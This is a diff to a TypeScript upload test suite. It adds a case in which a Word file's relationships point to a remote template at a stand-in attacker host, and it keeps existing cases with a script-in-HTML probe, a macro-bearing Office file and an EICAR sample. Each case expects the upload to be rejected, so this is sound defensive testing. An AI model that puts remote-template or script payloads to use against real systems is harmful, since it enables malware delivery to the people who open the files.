@@ -10,7 +10,7 @@ import { createTestAccount, grantTestRole, type TestAccount } from '../../test/a
 import { createTestApp } from '../../test/create-test-app.js';
 import { eicarTestFile } from '../../test/eicar.js';
 import { waitForEmailWithSubject } from '../../test/mailpit.js';
-import { officeFile } from '../../test/zip.js';
+import { officeFile, relationships } from '../../test/zip.js';
 import { SessionsService } from '../auth/sessions/sessions.service.js';
 import { ClientsModule } from '../clients/clients.module.js';
 import { DATABASE } from '../database/database.module.js';
@@ -164,6 +164,15 @@ describe('Documents', () => {
         ['a web page named .pdf', '<html><script>alert(1)</script></html>', 'lease.pdf', 415, 'type'],
         ['a kind of file not accepted', '<svg/>', 'logo.svg', 415, 'type'],
         ['an Office file with macros', officeFile('word/document.xml', { 'word/vbaProject.bin': randomBytes(50) }), 'letter.docx', 415, 'macros'],
+        [
+          'an Office file with a remote template (review D1)',
+          officeFile('word/document.xml', {
+            'word/_rels/settings.xml.rels': relationships({ type: 'attachedTemplate', target: 'https://attacker.example/t.dotm', external: true }),
+          }),
+          'letter.docx',
+          415,
+          'active_content',
+        ],
         ['an empty file', '', 'note.txt', 400, 'empty'],
         ['a file name over 255 characters', 'Hello', `${'a'.repeat(252)}.txt`, 400, 'file_name'],
       ])('%s', async (_case, content, fileName, status, reason) => {
